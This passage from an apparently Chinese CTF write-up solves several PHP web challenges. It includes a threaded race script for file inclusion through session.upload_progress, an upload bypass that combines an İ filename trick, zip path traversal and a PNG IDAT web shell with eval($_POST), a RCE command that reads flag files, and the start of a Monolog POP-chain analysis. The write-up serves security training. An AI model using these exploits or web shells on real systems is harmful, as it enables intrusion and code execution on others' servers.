<code>/.listing</code>，读取到如下内容。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">total 16 drwxr-xr-x 1 root root 4096 May 6 06:02 . drwxr-xr-x 1 root root 4096 Sep 22 2016 .. -rw-r--r-- 1 root root 257 Apr 29 11:46 index.php -rw-r--r-- 1 root root 19 Apr 29 10:51 you_can_seeeeeeee_me.php</span><br></pre></td></tr></table></figure><p>访问 <code>/you_can_seeeeeeee_me.php</code> 可以读取到 phpinfo 从而得知靶机 PHP 版本。猜测需要利用 session.upload_progress 进行文件包含。很容易找到如下参考文章。</p><blockquote><p><a href="https://www.freebuf.com/vuls/202819.html">https://www.freebuf.com/vuls/202819.html</a></p></blockquote><p>将文章中的 PoC 稍作修改如下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">sessid = <span class="string">&#x27;H3Xag&#x27;</span></span><br><span class="line">data = &#123;<span class="string">&quot;cf&quot;</span>: <span class="string">f&quot;../../../../../var/lib/php/sessions/acafaecced/sess_<span class="subst">&#123;sessid&#125;</span>&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27; &#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">        session.post(<span class="string">&#x27;http://123.60.215.249:25900/&#x27;</span>,</span><br><span class="line">                     data=&#123;</span><br><span class="line">                         <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php var_dump(readfile(&quot;/etc/acgfdffhbd/gfediefagf/hedbfegbjb/eegcbdabad/ibadcafecb/fl444444g&quot;)); ?&gt;&#x27;</span>&#125;,</span><br><span class="line">                     files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;actuallyEmpty.txt&#x27;</span>, f)&#125;, cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sessid&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"></span><br><span class="line">        resp = session.post(<span class="string">&#x27;http://123.60.215.249:25900/&#x27;</span>, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;CISCN&#x27;</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">            <span class="built_in">print</span>(resp.text)</span><br><span class="line">            event.clear()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+++++++++++++]retry&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    event = threading.Event()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=write, args=(session,)).start()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=read, args=(session,)).start()</span><br><span class="line">    event.<span class="built_in">set</span>()</span><br></pre></td></tr></table></figure><p>先利用 <code>var_dump(scandir())</code> 遍历 <code>/etc</code> 目录，找到奇怪的路径，层层访问后可以得到 <code>fl444444g</code> 文件。利用 <code>var_dump(readfile())</code> 将其读取出来，即得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CISCN&#123;FhDKa-MuU0P-FJ9lj-MsZcg-6hXCa-&#125;</span><br></pre></td></tr></table></figure><h3 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h3><p>题目给出了如下两部分代码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;ctf&quot;</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;ctf&quot;</span>]))</span><br><span class="line">    <span class="variable">$ctf</span> = <span class="variable">$_GET</span>[<span class="string">&quot;ctf&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ctf</span>==<span class="string">&quot;upload&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&#x27;postedFile&#x27;</span>][<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">1024</span>*<span class="number">512</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;这么大个的东西你是想d我吗？&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$imageinfo</span> = getimagesize(<span class="variable">$_FILES</span>[<span class="string">&#x27;postedFile&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$imageinfo</span> === <span class="literal">FALSE</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;如果不能好好传图片的话就还是不要来打扰我了&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$imageinfo</span>[<span class="number">0</span>] !== <span class="number">1</span> &amp;&amp; <span class="variable">$imageinfo</span>[<span class="number">1</span>] !== <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;东西不能方方正正的话就很讨厌&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$fileName</span>=urldecode(<span class="variable">$_FILES</span>[<span class="string">&#x27;postedFile&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(stristr(<span class="variable">$fileName</span>,<span class="string">&quot;c&quot;</span>) || stristr(<span class="variable">$fileName</span>,<span class="string">&quot;i&quot;</span>) || stristr(<span class="variable">$fileName</span>,<span class="string">&quot;h&quot;</span>) || stristr(<span class="variable">$fileName</span>,<span class="string">&quot;ph&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;有些东西让你传上去的话那可不得了&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$imagePath</span> = <span class="string">&quot;image/&quot;</span> . mb_strtolower(<span class="variable">$fileName</span>);</span><br><span class="line">    <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&quot;postedFile&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="variable">$imagePath</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;upload success, image at <span class="subst">$imagePath</span>&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;传都没有传上去&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过扫描可以得到 <code>example.php</code> 并且得到如下源码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;ctf&quot;</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;ctf&quot;</span>]))</span><br><span class="line">    <span class="variable">$ctf</span> = <span class="variable">$_GET</span>[<span class="string">&quot;ctf&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ctf</span>==<span class="string">&quot;poc&quot;</span>) &#123;</span><br><span class="line">    <span class="variable">$zip</span> = <span class="keyword">new</span> \ZipArchive();</span><br><span class="line">    <span class="variable">$name_for_zip</span> = <span class="string">&quot;example/&quot;</span> . <span class="variable">$_POST</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span>(explode(<span class="string">&quot;.&quot;</span>,<span class="variable">$name_for_zip</span>)[count(explode(<span class="string">&quot;.&quot;</span>,<span class="variable">$name_for_zip</span>))-<span class="number">1</span>]!==<span class="string">&quot;zip&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;要不咱们再看看？&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$zip</span>-&gt;open(<span class="variable">$name_for_zip</span>) !== <span class="literal">TRUE</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span> (<span class="string">&quot;都不能解压呢&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;可以解压，我想想存哪里&quot;</span>;</span><br><span class="line">    <span class="variable">$pos_for_zip</span> = <span class="string">&quot;/tmp/example/&quot;</span> . md5(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]);</span><br><span class="line">    <span class="variable">$zip</span>-&gt;extractTo(<span class="variable">$pos_for_zip</span>);</span><br><span class="line">    <span class="variable">$zip</span>-&gt;close();</span><br><span class="line">    unlink(<span class="variable">$name_for_zip</span>);</span><br><span class="line">    <span class="variable">$files</span> = glob(<span class="string">&quot;<span class="subst">$pos_for_zip</span>/*&quot;</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_dir(<span class="variable">$file</span>)) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$first</span> = imagecreatefrompng(<span class="variable">$file</span>);</span><br><span class="line">        <span class="variable">$size</span> = min(imagesx(<span class="variable">$first</span>), imagesy(<span class="variable">$first</span>));</span><br><span class="line">        <span class="variable">$second</span> = imagecrop(<span class="variable">$first</span>, [<span class="string">&#x27;x&#x27;</span> =&gt; <span class="number">0</span>, <span class="string">&#x27;y&#x27;</span> =&gt; <span class="number">0</span>, <span class="string">&#x27;width&#x27;</span> =&gt; <span class="variable">$size</span>, <span class="string">&#x27;height&#x27;</span> =&gt; <span class="variable">$size</span>]);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$second</span> !== <span class="literal">FALSE</span>) &#123;</span><br><span class="line">            <span class="variable">$final_name</span> = pathinfo(<span class="variable">$file</span>)[<span class="string">&quot;basename&quot;</span>];</span><br><span class="line">            imagepng(<span class="variable">$second</span>, <span class="string">&#x27;example/&#x27;</span>.<span class="variable">$final_name</span>);</span><br><span class="line">            imagedestroy(<span class="variable">$second</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        imagedestroy(<span class="variable">$first</span>);</span><br><span class="line">        unlink(<span class="variable">$file</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="mb-strtolower-image-size-bypass-and-zip-uploading"><a href="#mb-strtolower-image-size-bypass-and-zip-uploading" class="headerlink" title="mb_strtolower, image size bypass and zip uploading"></a>mb_strtolower, image size bypass and zip uploading</h4><p>上传处对图片的尺寸做出了要求，此时有一种方法来绕过。将下列代码拼接到文章最后即可绕过 <code>getimagesize</code> 的检测。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#define width 1</span><br><span class="line">#define height 1</span><br></pre></td></tr></table></figure><p>文件名也经过了过滤，结合后面的代码可知需要上传一个 zip 压缩文档。使用 <code>Latin Capital Letter I with Dot Above</code> 也就是 <code>İ</code> 可以绕过 <code>stristr</code> 并且在 <code>mb_strtolower</code> 之后变成小写字母 <code>i</code>。此时上传压缩文件变为可能，而 example.php 中提供了解压的业务。只要生成一个恶意的压缩文件使其解压后变成一个 PHP 文件即可写入 shell。配合目录穿越即可将 shell 写到可访问的 Web 目录下。</p><h4 id="imagecreatefrompng-bypass"><a href="#imagecreatefrompng-bypass" class="headerlink" title="imagecreatefrompng bypass"></a>imagecreatefrompng bypass</h4><p>example.php 中对文件进行了检测和裁剪，因此直接对图片进行修改无法通过检测从而使最后的文件被删除。因此此时需要生成一个可以通过检测的图片马。</p><blockquote><p><a href="https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/">https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</a></p><p><a href="https://github.com/huntergregal/PNG-IDAT-Payload-Generator/">https://github.com/huntergregal/PNG-IDAT-Payload-Generator/</a></p></blockquote><p>使用参考的 Repo 中的代码可以生成一个长度为 25 的任意 PHP payload 的正方形图片，只需要将自带的 payload 经过 Raw Deflate 之后再 Inflate 即可。这里直接放上最终的 PoC。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> mpmath <span class="keyword">import</span> rand</span><br><span class="line"><span class="keyword">from</span> myPOC.idat <span class="keyword">import</span> save_image, bypass_filters, verify</span><br><span class="line"></span><br><span class="line">PAYLOAD_LENGTH = <span class="number">20</span></span><br><span class="line"><span class="comment"># PAYLOAD = &quot;(\&quot;PHP\&quot;.\&quot;INFO\&quot;)()&quot;</span></span><br><span class="line">PAYLOAD = <span class="string">&quot;EVAL($_POST[\&quot;H3X\&quot;])&quot;</span></span><br><span class="line">DEFAULT_COMPRESSED_STRING = <span class="string">b&quot;\xa3\x9f\x67\x54\x6f\x2c\x24\x15\x2b\x11\x67\x12\x54\x6f\x11\x2e\x29\x15\x2b\x21\x67\x22\x6b\x6f\x5f\x53\x10&quot;</span></span><br><span class="line">ENV = <span class="string">&quot;http://QUESTION_HOST_HERE/&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RawDeflate</span>(<span class="params">data, compresslevel=<span class="number">9</span></span>):</span></span><br><span class="line">    compress = zlib.compressobj(</span><br><span class="line">        compresslevel,  <span class="comment"># level: 0-9</span></span><br><span class="line">        zlib.DEFLATED,  <span class="comment"># method: must be DEFLATED</span></span><br><span class="line">        -zlib.MAX_WBITS,  <span class="comment"># window size in bits:</span></span><br><span class="line">        <span class="comment">#   -15..-8: negate, suppress header</span></span><br><span class="line">        <span class="comment">#   8..15: normal</span></span><br><span class="line">        <span class="comment">#   16..30: subtract 16, gzip header</span></span><br><span class="line">        zlib.DEF_MEM_LEVEL,  <span class="comment"># mem level: 1..8/9</span></span><br><span class="line">        <span class="number">0</span>  <span class="comment"># strategy:</span></span><br><span class="line">        <span class="comment">#   0 = Z_DEFAULT_STRATEGY</span></span><br><span class="line">        <span class="comment">#   1 = Z_FILTERED</span></span><br><span class="line">        <span class="comment">#   2 = Z_HUFFMAN_ONLY</span></span><br><span class="line">        <span class="comment">#   3 = Z_RLE</span></span><br><span class="line">        <span class="comment">#   4 = Z_FIXED</span></span><br><span class="line">    )</span><br><span class="line">    deflated = compress.compress(data)</span><br><span class="line">    deflated += compress.flush()</span><br><span class="line">    <span class="keyword">return</span> deflated</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RawInflate</span>(<span class="params">data</span>):</span></span><br><span class="line">    decompress = zlib.decompressobj(-zlib.MAX_WBITS)</span><br><span class="line">    inflated = decompress.decompress(data)</span><br><span class="line">    inflated += decompress.flush()</span><br><span class="line">    <span class="keyword">return</span> inflated</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Generate payload</span></span><br><span class="line">payload = (PAYLOAD + <span class="string">&quot;&#123;&#125;&quot;</span>).<span class="built_in">format</span>(<span class="string">&quot; &quot;</span> * <span class="built_in">int</span>(PAYLOAD_LENGTH - (<span class="built_in">len</span>(PAYLOAD)))).encode()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Using payload ~&#123;&#125;~&quot;</span>.<span class="built_in">format</span>(payload))</span><br><span class="line">payloadWrapped = codecs.encode(</span><br><span class="line">    RawInflate(RawDeflate(DEFAULT_COMPRESSED_STRING).replace(<span class="string">b&quot;$_GET[0]($_POST[1]);&quot;</span>, payload)), <span class="string">&quot;hex_codec&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Generated wrapped payload &#123;&#125;&quot;</span>.<span class="built_in">format</span>(payloadWrapped))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Generate image</span></span><br><span class="line">evilImage = <span class="string">&quot;./evilImage.png&quot;</span></span><br><span class="line">filterProof = bypass_filters(payloadWrapped)</span><br><span class="line">save_image(filterProof, evilImage)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Generated Image &#123;&#125;&quot;</span>.<span class="built_in">format</span>(evilImage))</span><br><span class="line">verify(evilImage, payload)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Fin&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Generate zip</span></span><br><span class="line"><span class="keyword">if</span> os.path.isfile(<span class="string">&quot;poc.zip&quot;</span>):</span><br><span class="line">    os.remove(<span class="string">&quot;poc.zip&quot;</span>)</span><br><span class="line">evilZip = <span class="built_in">open</span>(<span class="string">&quot;evilImage.png&quot;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">zipFile = zipfile.ZipFile(<span class="string">&quot;poc.zip&quot;</span>, <span class="string">&quot;a&quot;</span>, zipfile.ZIP_DEFLATED)</span><br><span class="line">info = zipfile.ZipInfo(<span class="string">&quot;poc.zip&quot;</span>)</span><br><span class="line">shellname = <span class="string">f&quot;shell<span class="subst">&#123;rand()&#125;</span>.php&quot;</span></span><br><span class="line">zipFile.writestr(<span class="string">f&quot;../<span class="subst">&#123;shellname&#125;</span>&quot;</span>, evilZip)</span><br><span class="line">zipFile.close()</span><br><span class="line">evilZip = <span class="built_in">open</span>(<span class="string">&quot;poc.zip&quot;</span>, <span class="string">&#x27;a+&#x27;</span>)</span><br><span class="line">evilZip.write(<span class="string">&quot;\n#define width 1 \n#define height 1&quot;</span>)</span><br><span class="line">evilZip.close()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Upload file</span></span><br><span class="line">url = <span class="string">f&quot;<span class="subst">&#123;ENV&#125;</span>?ctf=upload&quot;</span></span><br><span class="line">payload = &#123;<span class="string">&#x27;ctf&#x27;</span>: <span class="string">&#x27;upload&#x27;</span>&#125;</span><br><span class="line">files = [(<span class="string">&#x27;postedFile&#x27;</span>, (<span class="string">&#x27;%2e%2e%2f%65%78%61%6d%70%6c%65%2fz1p.z%C4%B0p&#x27;</span>, <span class="built_in">open</span>(<span class="string">&#x27;poc.zip&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>), <span class="string">&#x27;application/octet-stream&#x27;</span>))]</span><br><span class="line">response = requests.post(url=url, data=payload, files=files, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+] Response is <span class="subst">&#123;response.text&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Trigger file inflate</span></span><br><span class="line">url = <span class="string">f&quot;<span class="subst">&#123;ENV&#125;</span>example.php?ctf=poc&quot;</span></span><br><span class="line">payload = <span class="string">&#x27;file=z1p.zip&#x27;</span></span><br><span class="line">headers = &#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>&#125;</span><br><span class="line">response = requests.post(url=url, headers=headers, data=payload, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+] Response is <span class="subst">&#123;response.text&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+] Maybe done, access at <span class="subst">&#123;ENV&#125;</span>example/<span class="subst">&#123;shellname&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>运行 PoC 之后可以使用得到的 shell 进行 RCE。使用如下载荷可以得到 flag。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">H3X&#x3D;system(&quot;cat &#x2F;etc&#x2F;fllagggaaaa&#x2F;ejklwfthreu8rt&#x2F;fgrtgergyer&#x2F;ergerhrtytrh&#x2F;rtehtrhytryhre&#x2F;gfhtryrtgrewfre34t&#x2F;t43ft34f&#x2F;flag11e3kerjh3u&quot;);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;12e6ea81-d44a-4251-a9a7-a9ab7fe5ab97&#125;</span><br></pre></td></tr></table></figure><h3 id="filter"><a href="#filter" class="headerlink" title="filter"></a>filter</h3><p>附件的 composer.json 中给出了如下内容。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;monolog/monolog&quot;:&quot;1.19&quot;</span><br></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#x27;log&#x27; =&gt; [</span><br><span class="line">           &#x27;traceLevel&#x27; =&gt; YII_DEBUG ? 0 : 0,</span><br><span class="line">           &#x27;targets&#x27; =&gt; [</span><br><span class="line">               [</span><br><span class="line">                   &#x27;class&#x27; =&gt; &#x27;yii\log\FileTarget&#x27;,</span><br><span class="line">                   &#x27;levels&#x27; =&gt; [&#x27;error&#x27;],</span><br><span class="line">                   &#x27;logVars&#x27; =&gt; [],</span><br><span class="line">               ],</span><br><span class="line">           ],</span><br><span class="line">       ],]</span><br></pre></td></tr></table></figure><h4 id="POP-链"><a href="#POP-链" class="headerlink" title="POP 链"></a>POP 链</h4><p>主要 RCE 的点在 BufferHandler.php 下 <code>handle</code> 的 <code>call_user_func()</code>。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/ab96538f-1f60-45c7-abf2-b5a32ffe7625/1621688756359/63c21883c8c7f9dbde22b9c9c8f22d0dc6b26545.png"></p><p><code>$processor</code> 和 <code>$record</code> 是可控的变量，因此向上追溯。在父类 <code>AbstractHandler</code> 的方法中找到以下可调用到的方法。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/ab96538f-1f60-45c7-abf2-b5a32ffe7625/1621689022054/4ffe0ae7a3425a11ed38f132aefe4dff0313eadc.png"></p><p>因此需要找调用到 <code>handlerBatch</code> 的方法，很容易找到 <code>close()</code> 到 <code>flush()</code> 的路线，因此只需要找能触发到一个可控类的 <code>close()</code> 或者 <code>flush()</code> 方法的类。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/ab96538f-1f60-45c7-abf2-b5a32ffe7625/1621689068116/e5435adfb2b2c6bf5e082322a64a8b64cc824d14.png"></p><p>此时想要触发到这里需要保证 <code>$this-&gt;handler</code> 也是 <code>BufferHandler</code>，简单将 <code>$this</code> clone 一份即可达成目的。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/ab96538f-1f60-45c7-abf2-b5a32ffe7625/1621689084933/0b1c82bf55fa8d9a93efc4dbe5f677c4d77c5d5e.png"></p><p>在 <code>SyslogUdpHandler.php</code> 下可以找到一个符合条件的 <code>close()</code> 方法，<code>$socket</code> 是一个可控的变量，因此需要想办法触发到这个 <code>close()</code> 方法。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/ab96538f-1f60-45c7-abf2-b5a32ffe7625/1621689506835/7acf0471b69bbd7c27ebe510249d90e41c110fba.png" alt="image-20210522211826020"></p><p>在 <code>AbstractHandler.php</code> 可以找到一个析构函数调用到了 <code>close()</code> 方法。同时 <code>SyslogUdpHandler</code> 继承了这个类且没有重写析构函数，因此此处的 <code>close()</code> 恰好可以触发到上述的可控的 